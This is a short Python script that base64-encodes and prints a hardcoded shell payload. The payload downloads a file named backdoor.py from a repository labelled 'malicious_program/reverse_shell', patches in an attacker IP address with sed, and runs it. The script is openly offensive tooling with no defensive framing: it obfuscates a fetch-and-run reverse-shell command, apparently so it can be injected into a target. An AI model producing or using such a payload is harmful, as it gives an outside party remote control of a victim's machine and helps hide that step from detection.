import base64

def b64encode(payload):
  encoded_bytes = payload.encode("utf-8")
  encoded_str = base64.b64encode(encoded_bytes)
  print(encoded_str)
  
if __name__ == "__main__":
  payload = "curl -O https://raw.githubusercontent.com/Yao-Wen-Chang/malicious_program/master/reverse_shell/backdoor.py && sed -i 's/1.1.1.1/10.12.143.18/' backdoor.py && python backdoor.py"
  b64encode(payload=payload)